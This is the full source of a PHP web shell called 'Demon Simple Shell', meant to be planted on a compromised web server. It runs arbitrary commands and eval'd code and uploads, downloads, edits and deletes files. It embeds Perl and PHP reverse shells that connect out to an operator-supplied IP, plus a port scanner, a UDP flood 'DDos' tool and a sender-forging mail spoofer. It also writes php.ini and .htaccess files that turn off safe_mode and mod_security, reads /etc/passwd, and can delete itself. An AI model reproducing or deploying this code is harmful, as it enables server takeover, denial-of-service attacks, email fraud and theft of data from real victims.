<!--(Demon Simple Shell Developed By Arash Khazaei A.K.A Xodiak And The Nonexistent)-->
<html>
<head>
    <title>Demon Simple Shell</title>
    <style>
        p{
            font-family: Courier;
            color: darkgreen;
            font-size: 15px;
        }
        
        a:link
        {
        color:inherit;
        text-decoration:none
        }
        
        a:visited 
        {
        color:inherit;
        text-decoration:none;  
        }
        
        a:active 
        {
        color:inherit;
        text-decoration:none; 
        }
        
        a:hover
        {
        color:inherit;
        text-decoration:none; 
        }
        
        #normaltext{
            font-family: Courier;
            color: darkgreen;
            font-size: 15px;
            text-shadow:black;
        }
        
        #textareas {
            font-family: monospace;
            color: darkgreen;
            font-size: 15px;
            border: hidden;
            text-shadow: black;
            background-color: #000000;
            border: solid;
            border-color: darkgreen;
            height: 10cm;
            width: 22cm;
        }
    </style>
</head>

<body bgcolor="black">
<center>
    <hr id="">
    <h2 style="font-family:Courier;color: darkgreen;text-shadow: black">D3m0N Sheller </h2>
    <hr>
</center>
<div id="normaltext">
    <?php
    echo "Uname -a~:".php_uname();
    echo "<br>";
    echo "Id(User):";
    echo passthru("id");
    echo "<br>";
    $host= gethostname();
    $ip = gethostbyname($host);
    echo "Server Ip:" . $ip;
    echo "<br>";
    echo "Your Ip:" . $_SERVER['REMOTE_ADDR'];
    echo "<br>";
    echo "PHP Version~:".phpversion();
    echo "<br> PWD~: ".getcwd(); echo '/';
    echo "<br>Mysql Version~: ".mysql_get_server_info();
    echo "<br>Apache Version~: ".apache_get_version();
    ?>
    <br/>Disabled Functions: <?php error_reporting(E_ALL); $disabled_functions = ini_get('disable_functions'); if ($disabled_functions!='') { $arr = explode(',', $disabled_functions); sort($arr); echo '<font color=darkred>Disabled Functions:<br>'; for ($i=0; $i<count($arr); $i++){ echo $arr[$i].' - </font>';} } else { echo '<font color=lightgreen>All Functions Are Enabled</font>';} ?> 
    <hr>
</div>
<center>
    <font style="color:darkgreen">[</font>&nbsp;<font style="color:#33FF00; font-family: Courier; font-size: 15px; text-shadow:black; text-decoration:none; "><a href="?p=0">Home</a></font>&nbsp;<font style="color:darkgreen">]</font>
    <font style="color:darkgreen">[</font>&nbsp;<font style="color:#33FF00; font-family: Courier; font-size: 15px; text-shadow:black; text-decoration:none; "><a href="?p=1">Back Connect</a></font>&nbsp;<font style="color:darkgreen">]</font>
    <font style="color:darkgreen">[</font>&nbsp;<font style="color:#33FF00; font-family: Courier; font-size: 15px; text-shadow:black; text-decoration:none; "><a href="?p=2">Port Scanner</a></font>&nbsp;<font style="color:darkgreen">]</font>
    <font style="color:darkgreen">[</font>&nbsp;<font style="color:#33FF00; font-family: Courier; font-size: 15px; text-shadow:black; text-decoration:none; "><a href="?p=3">DDos</a></font>&nbsp;<font style="color:darkgreen">]</font>
    <font style="color:darkgreen">[</font>&nbsp;<font style="color:#33FF00; font-family: Courier; font-size: 15px; text-shadow:black; text-decoration:none; "><a href="?p=4">Mail Spoof</a></font>&nbsp;<font style="color:darkgreen">]</font>
    <font style="color:darkgreen">[</font>&nbsp;<font style="color:#33FF00; font-family: Courier; font-size: 15px; text-shadow:black; text-decoration:none; "><a href="?p=5">String Encoder</a></font>&nbsp;<font style="color:darkgreen">]</font>
    <font style="color:darkgreen">[</font>&nbsp;<font style="color:#33FF00; font-family: Courier; font-size: 15px; text-shadow:black; text-decoration:none; "><a href="?p=6">PHPINFO()</a></font>&nbsp;<font style="color:darkgreen">]</font>
    <font style="color:darkgreen">[</font>&nbsp;<font style="color:#33FF00; font-family: Courier; font-size: 15px; text-shadow:black; text-decoration:none; "><a href="?p=7">Eval</a></font>&nbsp;<font style="color:darkgreen">]</font>
    <font style="color:darkgreen">[</font>&nbsp;<font style="color:#33FF00; font-family: Courier; font-size: 15px; text-shadow:black; text-decoration:none; "><a href="?p=8">Bypassers</a></font>&nbsp;<font style="color:darkgreen">]</font>
    <font style="color:darkgreen">[</font>&nbsp;<font style="color:#33FF00; font-family: Courier; font-size: 15px; text-shadow:black; text-decoration:none; "><a href="?p=9">Self Kill</a></font>&nbsp;<font style="color:darkgreen">]</font>
</center>
<?php
if ((!isset($_GET['p']) || $_GET['p']=="0") && !isset($_GET['edit']))
{
    ?>
    <hr>
<center>
<p>CMD~#</p>
<form method="post" action="" enctype="multipart/form-data">
    <input type="text" style="color:darkgreen;background-color:#000000" name="command" value="">
    <input type="submit" style="color:darkgreen;background-color:#000000" value="Execute" name="execute">
</form>
<center>
<textarea name="OutPut" id="textareas" spellcheck="false" style="height: 10cm;width: 22cm;color:darkgreen;background-color:#000000">
<?php
$command = $_POST['command'];
$wdir = getcwd().'/';
if (isset($_POST['home']))
{
$wdir = getcwd().'/';
unset($_POST['wdir']);
}
if (isset($_POST['wdir']))
{
$wdir = $_POST['wdir'];
}
if (isset($_POST['command'])){
    htmlspecialchars(passthru($command));
}
if($command == ""){
    htmlspecialchars(passthru("ls -lart $wdir"));

}else
{
    echo htmlspecialchars($command);
}
?>
</textarea>
</center>
<br>
<div align="left">
<form method="post" action="">
<font style="font-family: Courier;color: darkgreen;font-size: 15px;text-shadow:black;">Working Directory:</font><input type="text" style="width: 50%; color:darkgreen;background-color:#000000" name="wdir" value="<?php echo $wdir;?>"/>
<input type="submit" name="wsub" style="color:darkgreen;background-color:#000000" value="Go"/>
<input type="submit" name="home" style="color:darkgreen;background-color:#000000" value="Shell Home"/>
</form>

<form method="get" action="">
<font style="font-family: Courier;color: darkgreen;font-size: 15px;text-shadow:black;">Create/Edit Files:</font><input type="text" name="edit" style="width: 50%; color:darkgreen;background-color:#000000" value="File Name">
<input type="submit" value="Edit" style="color:darkgreen;background-color:#000000">
</form>
</div>
<hr>
<?php
if (isset($_FILES['upload']))
{
    $file = $_FILES['upload'];
    $directory = getcwd();
    move_uploaded_file($file['tmp_name'],"{$directory}/{$file['name']}");
    $base64 = $_POST['base64'];
}
$dir = getcwd();
$file_name = __FILE__;
chmod($file_name, 0755);
ob_start();
?>

<p style="font-size: medium"> Upload File </P>
    <form action="" method="post" enctype="multipart/form-data">


        <p>

            <input type="file" style="color:darkgreen;background-color:#000000" name="upload"/>
            <input type="submit" style="color:darkgreen;background-color:#000000" value="Upload"/>


        </p>

    </form>

<hr>
<?php
if (isset($_POST['fname']))
{
$file = $_POST['fname'];

if (file_exists($file))
{
header('Content-Description: File Transfer');
header('Content-Type: application/octet-stream');
header('Content-Disposition: attachment; filename="'.basename($file).'"');
header('Expires: 0');
header('Cache-Control: must-revalidate');
header('Pragma: public');
header('Content-Length: ' . filesize($file));
readfile($file);
exit;
}
else
    {
    echo "File Does Not Exist.";
    }
}
?>
<P> File Downloader</P>
</font>
<form action="" method="post">
    <input type="text" style="color:darkgreen;background-color:#000000" value="File Name" name="fname"/>
    <input type="submit" style="color:darkgreen;background-color:#000000" value="Download It!" name="submit"/>
</form>
<hr>
<p style="font-size: medium"> Chmod </P>
<form action="" method="post">
<input type="text" style="color:darkgreen;background-color:#000000" value="File Name" name="chmodname"/>
<select name="chmodmod" style="color:darkgreen;background-color:#000000">
<option value="0755" selected="selected">0755</option>
<option value="0777">777</option>0644
<option value="0644">0644</option>
</select>
<input type="submit" style="color:darkgreen;background-color:#000000" name="chmodsub" value="Go"/>
</form>
<?php
if (isset($_POST['chmodname']))
{
    $chmodname = $_POST['chmodname'];
    $chmodmod =(int) $_POST['chmodmod'];
    system("chmod $chmodmod $chmodname");
    unset($_POST['chmodname']);
}
?>
<hr>
<form method="post" action="">
<p style="text-align: 10px">Delete File:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Create Directory:</p> <input type="text" style="color:darkgreen;background-color:#000000" name="delname" value="Delete File"/>
<input type="submit" style="color:darkgreen;background-color:#000000" name="delsub" value="Go"/>
------------
<input type="text" name="newdirn" style="color:darkgreen;background-color:#000000" value="Create Directory">
<input type="submit" value="Go" style="color:darkgreen;background-color:#000000">
</form>
<?php
if(isset($_POST['delname'])){
$delname=$_POST['delname'];
unlink($delname);
}
?>
<?php
if (isset($_POST['newdirn']))
{
    $newdirn = $_POST['newdirn'];
    system("mkdir $newdirn");
    unset($_POST['newdirn']);
}
?>
</center>
<?php
}
?>
<?php
if (isset($_GET['p']) && $_GET['p']=="1")
{
    ?>
<center>
<hr>
<p style="font-size: medium"> Back Connect </P>
<!--Perl Back Connect -->
<p style="color:yellow">Perl</p> <form action="" method="post"> <input type="text" style="color:darkgreen;background-color:#000000" name="perlbcip" value="Your Ip Address"/> <input type="text" style="color:darkgreen;background-color:#000000" name="perlbcport" style="width: 40px" value="Port"/> <input type="submit" style="color:darkgreen;background-color:#000000" name="perlbcsubmit" value="Connect"/> </form>
<?php
$script = '#!/usr/bin/perl
# ConnectBackShell in Perl. Shadow120 - w4ck1ng.com

use Socket;

$host = $ARGV[0];
$port = $ARGV[1];

    if (!$ARGV[0]) {
  printf "[!] Usage: perl script.pl <Host> <Port>\n";
  exit(1);
}
print "[+] Connecting to $host\n";
$prot = getprotobyname(\'tcp\'); # You can change this if needs be
socket(SERVER, PF_INET, SOCK_STREAM, $prot) || die ("[-] Unable to Connect !");
if (!connect(SERVER, pack "SnA4x8", 2, $port, inet_aton($host))) {die("[-] Unable to Connect !");}
  open(STDIN,">&SERVER");
  open(STDOUT,">&SERVER");
  open(STDERR,">&SERVER");
  exec {\'/bin/sh\'} \'-bash\' . "\0" x 4;  ';
  //Start Of Execute
  if (isset($_POST['perlbcip']) && isset($_POST['perlbcport']))
  {
      $perlbcip = $_POST['perlbcip'];
      $perlbcport = $_POST['perlbcport'];
      $handle = fopen("0xbc.pl", "w");
      fwrite($handle, $script);
      fclose($handle);
      system("perl 0xbc.pl $perlbcip $perlbcport");
      unset($_POST['perlbcip']);
      unset($_POST['perlbcport']);
  }
?>
<!-- End Of Perl Back Connect -->
<!--Php Back Connect -->
<p style="color:red">PHP</p> 
<form action="" method="post"> 
<input type="text" style="color:darkgreen;background-color:#000000" name="phpbcip" value="Your IP Address" />
<input type="text" style="color:darkgreen;background-color:#000000" name="phpbcport" style="width: 40px" value="Port"/>
<input type="submit" style="color:darkgreen;background-color:#000000"  name="phpbcsubmit" value="Connect"/> 
 </form>
 <?php
$phpscript =  '
#/usr/bin/php
<?php
    set_time_limit (0);
    $VERSION = "1.0";
    $ip = $argv[0] ;  // CHANGE THIS
    $port = $argv[1];       // CHANGE THIS
    $chunk_size = 1400;
    $write_a = null;
    $error_a = null;
    $shell = \'uname -a; w; id; /bin/sh -i\';
    $daemon = 0;
    $debug = 0;
    if (function_exists(\'pcntl_fork\')) {
        $pid = pcntl_fork();

        if ($pid == -1) {
            printit("ERROR: Can\'t fork");
            exit(1);
        }

        if ($pid) {
            exit(0);  // Parent exits
        }

        if (posix_setsid() == -1) {
            printit("Error: Cant setsid()");
            exit(1);
        }

        $daemon = 1;
    } else {
        printit("WARNING: \Failed to daemonise.  This is quite common and not fatal."\);
    }

    chdir("/");

    umask(0);

    $sock = fsockopen($ip, $port, $errno, $errstr, 30);
    if (!$sock) {
        printit("$errstr ($errno)");
        exit(1);
    }

    $descriptorspec = array(
        0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
        1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
        2 => array("pipe", "w")   // stderr is a pipe that the child will write to
    );

    $process = proc_open($shell, $descriptorspec, $pipes);

    if (!is_resource($process)) {
        printit("\ERROR: Cant spawn shell"\);
        exit(1);
    }

    stream_set_blocking($pipes[0], 0);
    stream_set_blocking($pipes[1], 0);
    stream_set_blocking($pipes[2], 0);
    stream_set_blocking($sock, 0);

    printit(\"Successfully opened reverse shell to $ip:$port\");

    while (1) {
        if (feof($sock)) {
            printit("ERROR: Shell connection terminated");
            break;
        }

        if (feof($pipes[1])) {
            printit("ERROR: Shell process terminated");
            break;
        }

        $read_a = array($sock, $pipes[1], $pipes[2]);
        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

        if (in_array($sock, $read_a)) {
            if ($debug) printit("SOCK READ");
            $input = fread($sock, $chunk_size);
            if ($debug) printit("SOCK: $input");
            fwrite($pipes[0], $input);
        }

        if (in_array($pipes[1], $read_a)) {
            if ($debug) printit("STDOUT READ");
            $input = fread($pipes[1], $chunk_size);
            if ($debug) printit("STDOUT: $input");
            fwrite($sock, $input);
        }
        if (in_array($pipes[2], $read_a)) {
            if ($debug) printit("STDERR READ");
            $input = fread($pipes[2], $chunk_size);
            if ($debug) printit("STDERR: $input");
            fwrite($sock, $input);
        }
    }
    fclose($sock);
    fclose($pipes[0]);
    fclose($pipes[1]);
    fclose($pipes[2]);
    proc_close($process);
    function printit ($string) {
        if (!$daemon) {
            print "$string\n";
        }
    }
    ?>';

    if (isset($_POST['phpbcip']) && isset($_POST['phpbcport']))
    {
        $phpbcip = $_POST['phpbcip'];
        $phpbcport = $_POST['phpbcport'];
        $handle2 = fopen("0Nbc.php", "w");
        fwrite($handle2, $phpscript);
        fclose($handle2);
        system("php 0Nbc.php $phpbcip $phpbcport");
        unset($_POST['phpbcip']);
        unset($_POST['phpbcport']);
    }
    echo "</center>";
    }
    ?>

<!-- End Of Php Back Connect -->  
<?php
if (isset($_GET['p']) && $_GET['p']=="2")
{
    ?>
    <center>
<hr>
<p style="font-size: medium"> Port Scanner </P>
<form action="" method="post">
    <p>HOST</p> 
    <input type="text" style="color:darkgreen;background-color:#000000" name="pscanhost" value="127.0.0.1">
    <p>Start Port</p> 
    <input type="text" style="color:darkgreen;background-color:#000000" name="pscansport" value="0">
    <p>End Port</p>
    <input type="text" style="color:darkgreen;background-color:#000000" name="pscaneport" value="100">
    <br />
    <br />
    <input type="submit" style="color:darkgreen;background-color:#000000" name="pscansubmit" value="Start">
</form>
<!--Start PHP PortScanner-->
<?php
    echo "<p>Result:</p>";
    echo "<p>----------------------</p>";
    if (isset($_POST['pscanhost']) && isset($_POST['pscansport']) && isset($_POST['pscaneport']))
    {
        if (is_numeric($_POST['pscansport']) && is_numeric($_POST['pscaneport']))
        {
            $host = $_POST['pscanhost'];
            $start_port = $_POST['pscansport'];
            $end_port = $_POST['pscaneport'];
            //Start The Loop
            for($i = $start_port ; $i<=$end_port ; $i++)
            {
                $ps = fsockopen($host, $i, $errnum, $errstring, 3);
                if ($ps)
                {
                    echo "<font style='color:red'>Port</font> <font style=\"color:yellow\">$i</font> <font style=\"color:red\">Is</font> <font                            style=\"color:green\">OPEN</font>";
                    echo "<br />";
                }
                flush();
            }
            unset($host);
            unset($start_port);
            unset($end_port);
        }
    }
            echo "<p>----------------------</p>";
            unset($_POST['pscanhost']);
            unset($_POST['pscansport']);
            unset($_POST['pscaneport']);
?>
<!--End Of PHP PortScanner-->
  </center>
  <?php
}
  ?>

    <center>
        <hr>

        <body>
        <center>
            <?php
            if(isset($_GET['p']) && $_GET['p'] == "3")
            {
            ?>
            <font color="darkgreen" id="DDOS">

                <?php
                error_reporting(0);
                //UDP
                if (isset($_POST['host']) && isset($_POST['time'])) {
                    $packets = 0;
                    ignore_user_abort(TRUE);
                    set_time_limit(0);

                    $exec_time = $_POST['time'];

                    $time = time();
                    //print "Started: ".time('d-m-y h:i:s')."<br>";
                    $max_time = $time + $exec_time;

                    $host = $_POST['host'];

                    for ($i = 0; $i < 65000; $i++) {
                        $out .= 'X';
                    }
                    while (1) {
                        $packets++;
                        if (time() > $max_time) {
                            break;
                        }
                        $rand = rand(1, 65000);
                        $port80 = '80';
                        $fp = fsockopen('udp://' . $host, $port80, $errno, $errstr, 5);
                        if ($fp) {
                            fwrite($fp, $out);
                            fclose($fp);
                        }
                    }
                    echo "<br><b>_ReSultZ_</b><br><font color=red><b>Completed with $packets (" . round(($packets), 2) . " MB) packets averaging " . round($packets, 2) . " packets per second </b></font>\n";
                    echo '<br><br>
        <form action="" method=POST>
        Host: <br><input type="text" style="color:darkgreen;background-color:#000000" name="host"><br>
        Length (seconds): <br><input type="text" style="color:darkgreen;background-color:#000000" name="time"><br><br>
        <input type="submit" style="color:darkgreen;background-color:#000000" value="Start"  ></form>';
                } else {
                    echo '<br><b>DDos UDP Flood</b><br>
            <form action="" method=POST>
            Host: <br><input type="text" style="color:darkgreen;background-color:#000000" name="host" value=><br>
            Length (seconds): <br><input type="text" style="color:darkgreen;background-color:#000000" name="time" value=><br><br>
            <input type="submit" style="color:darkgreen;background-color:#000000" value="Start"   ></form>';
                }
                ?>
        </center>
        <?php
        }
        ?>
        <?php
        if (isset($_GET['p']) && $_GET['p']== "4" )
        {
        ?><center>

            <form action="" method="post">

                <p> Mail To :</p> <input type="text" style="color:darkgreen;background-color:#000000" name="mailto"><br><br>
                <p>From : </p>   <input type="text" style="color:darkgreen;background-color:#000000" name="from"><br><br>
                <p> Subject :</p> <input type="text" style="color:darkgreen;background-color:#000000" name="subject"><br><br>
                <p>Message:</p> <br><br>
                    <textarea name="msg" spellcheck="false" style="border:1px dotted darkgreen; width: 500px; height: 270px; background-color:#0C0C0C; font-family:Tahoma; font-size:14pt; color:darkgreen"></textarea><br><br>
                    <input type="submit" name="submit" style="color:darkgreen;background-color:#000000" value="Send !">
            </form>
<?php
////////
if(isset($_POST['mailto']) && isset($_POST['subject']) && isset($_POST['msg']) && isset($_POST['from']) && isset($_POST['submit'])) {
    $to = ($_POST['mailto']);
    $subject = ($_POST['subject']);
    $message = ($_POST['msg']);
    $from = ($_POST['from']);
    $headers .= 'From:' . $from . "\n";
    $headers .= 'Reply-To:' . $from . "\n";
//
    if (isset($_POST['submit'])) {
        $mail = mail($to, $subject, $message, $headers);
        if ($mail == true) {
            echo '<script>alert("Email Has Been Send !!")</script>';
        } else {
            echo '<script>alert("Cant Send Email ....!")</script>';
        }
    }
}
            ?>
            </center>
            <hr>
        <?php
        }
        ?>
         <!--END Mail Spoofer -->

                <!-- Start String Encoder -->
                <?php
                if(isset($_GET['p']) && $_GET['p'] == "5") {


                    ?>

                    <form method="post" action="" enctype="application/x-www-form-urlencoded" name="">
                        <center>
                            <h4 id="normaltext">Algo's(MD5 , SHA and Base64)</h4>
                            <input name="string" style="color:darkgreen;background-color:#000000" type="text" />
                            <input type="submit" style="color:darkgreen;background-color:#000000" value="Encode"/>
                        </center>
                        <?php

                        if(isset($_POST['string'])) {
                            $string = $_POST['string'];
                            echo "<pre>";
                            echo "MD4: ".hash('md4', $string);
                            echo "<br>";
                            echo "MD5: ".md5($string);
                            echo "<br>";
                            echo "MD5x2: ".md5(md5($string));
                            echo "<br>";
                            echo "MD5x3: ".md5(md5(md5($string)));
                            echo "<br>";
                            echo "MD5x4: ".md5(md5(md5(md5($string))));
                            echo "<br>";
                            echo "Base64: ".base64_encode($string);
                            echo "<br>";
                            echo "SHA1: ".sha1($string);
                            echo "<br>";
                            echo "SHA256: ".hash('sha256', $string);
                            echo "<br>";
                            echo "SHA384: ".hash('sha384', $string);
                            echo "<br>";
                            echo "SHA512: ".hash('sha512', $string);

                            echo "</pre>";
                        }
                        ?>




                    </form>
                <?php

                }
                ?>

                <!--End String Encoder-->
                <!-- Start PHPINFO -->
                <div  id="normaltext" style="background-color: black;">

                    <?php

                    if (isset($_GET['p']) && $_GET['p'] == "6"){
                        ?>

                        <?php phpinfo();?>



                    <?php }?>
                </div>
                <!-- END PHPINFO -->
                <!--Start Of Eval PHP Code -->
                <?php
                if(isset($_GET['p']) && $_GET['p'] == "7"){
                    ?>
            <form method="post" action="" style=" color:darkgreen;background-color:#000000" enctype="application/x-www-form-urlencoded" name="eval" ">
            <input name="eval" type="text" style="color:darkgreen;background-color:#000000">
            <input type="submit" value="Eval Code!" style=" color:darkgreen;background-color:#000000">
            </form>
            <h3 id="normaltext">Result: </h3>
<br/>

        <textarea id="textareas" style="height: 10cm;width: 22cm;color:darkgreen;background-color:#000000">
          <?php
                    if (isset($_POST['eval'])) {
                        $evalcode = $_POST['eval'];
                        $evaled = eval($evalcode);
                        echo $evaled;
                    }
                    ?>
        </textarea>
    <?php
                }
                ?>
                <!-- End Of Eval PHP Code        -->
                <!-- Start Bypassers -->
                <?php
                if (isset($_GET['p']) && $_GET['p'] == '8')
                {
                    ?>
                    <form action="" method="post" enctype="application/x-www-form-urlencoded" >

                        <input type="submit" name="phpini" value="PHP.INI" style="width: auto;height: 1cm; color:darkgreen;background-color:#000000" onclick="alert('PHP.INI & INI.PHP Created!!')" />
                        <br/><p id="normaltext">-----------------------</p>
                        <input type="submit" name="apachehtaccess" value=".HTACCESS" style="width: auto;height: 1cm; color:darkgreen;background-color:#000000" onclick="alert('.Htaccess File Created Successfully')">
                        <br/><p id="normaltext">-----------------------</p>
                        <input type="submit" name="readpasswd" value="Read /ETC/PASSWD" style="width: auto;height: 1cm; color:darkgreen;background-color:#000000" />
                    </form>
                    <?php
                    if(isset($_POST['phpini'])){
                        $phpini = $_POST['phpini'];
                        $IniphpCreate = fopen("ini.php", "w");
                        $IniphpSource = '
            <?
echo ini_get("safe_mode");
echo ini_get("open_basedir");
include($_GET["file"]);
ini_restore("safe_mode");
ini_restore("open_basedir");
echo ini_get("safe_mode");
echo ini_get("open_basedir");
include($_GET["ss"]);
            ?>
            ';
                        fwrite($IniphpCreate, $IniphpSource);
                        $PhpIniCreate = fopen("php.ini", "w");
                        $PhpIniSource = '
                safe_mode=OFF
                disable_functions=ByPass By Xodiak And TheNonexistent
                ';
                        fwrite($PhpIniCreate, $PhpIniSource);

                    }
                    ?>
                    <?php
                    if(isset($_POST['apachehtaccess'])){
                        $apachehtaccess = $_POST['apachehtaccess'];
                        $aphttaccessCreate = fopen(".htaccess", "w");
                        $aphttaccessSource =
                            "
             #Created By Xodiak And TheNonexsistent
             <IfModule mod_security.c>
             Sec------Engine Off
             Sec------ScanPOST Off
             </IfModule>
                ";
                        fwrite($aphttaccessCreate, $aphttaccessSource);

                    }

                    ?>
                    <?php
                    if(isset($_POST['readpasswd'])){
                        $readpasswd = $_POST['readpasswd'];
                        echo "<textarea spellcheck=\"false\" id=\"textareas\">";

                        echo file_get_contents('/etc/passwd');

                        echo "</textarea>";

                    }
                    ?>




                <?php }?>

                <!-- End Of Bypassers -->
                <!-- Self Kill Start -->
               

                <?php
                if(isset($_GET['p']) && $_GET['p'] == '9'){
                    ?>
                     <form action="" method="post" enctype="application/x-www-form-urlencoded" name="selfkill">

                    <input type="submit" name="selfkill" style="width: 10%; height: 10%; color:darkgreen;background-color:#000000" value="Remove Shell!!" onclick="alert('Shell Removed SuccessFully')"/>


                </form>
                    <?php
                    if(isset($_POST['selfkill'])){
                        $selfkill = $_POST['selfkill'];
                        $selffile = __FILE__;
                        unlink($selffile);
                    }




                    ?>


                <?php } ?>
                <!-- Self Kill End -->
                <!--File Edit Start-->
                <?php
                if(isset($_GET['edit'])){
                    ?>
                    <?php
                    $filename = $_GET['edit'];
                    $filename = getcwd().'/'.$filename;
                    $fwhandle = fopen($filename,"r");
                    $contents = fread($fwhandle, filesize($filename));
                    fclose($fwhandle);
                    $fhandle = fopen($filename,"w");
                    echo "<font style=\"font-family: Courier;color: darkgreen;font-size: 15px;text-shadow:black;\">File Name: </font><font style=\"font-family: Courier;color: darkred;font-size: 15px;text-shadow:black;\">$filename</font>";
                    if (isset($_POST['done']) && $_POST['done'] == 1)
                    {
                    echo "<br>";
                    echo "<font style=\"font-family: Courier;color: lightblue;font-size: 15px;text-shadow:black;\">Saved Successfully!</font>";
                    unset($_POST['done']);
                    }
                    ?>
                    <form action="" method="post">
                    <textarea name="fecontent" id="textareas" spellcheck="false" style="height: 10cm;width: 22cm;color:darkgreen;background-color:#000000"><?php
                    echo htmlspecialchars($contents);
                    ?></textarea>
                    <br>
                    <br>
                    <input name="fesub" type="submit" style="color:darkgreen;background-color:#000000" value="Save"/>
                    <input name="done" type="hidden" value="1"/>
                    </form>
                    <?php
                    if (isset($_POST['fecontent']))
                    {
                        $newcontent = $_POST['fecontent'];
                        fwrite($fhandle, $newcontent);
                        fclose($fhandle);
                        unset($_POST['fecontent']);
                        unset($newcontent);
                    }
                    } ?>
                    <!--File Edit End-->
</body>
</html>
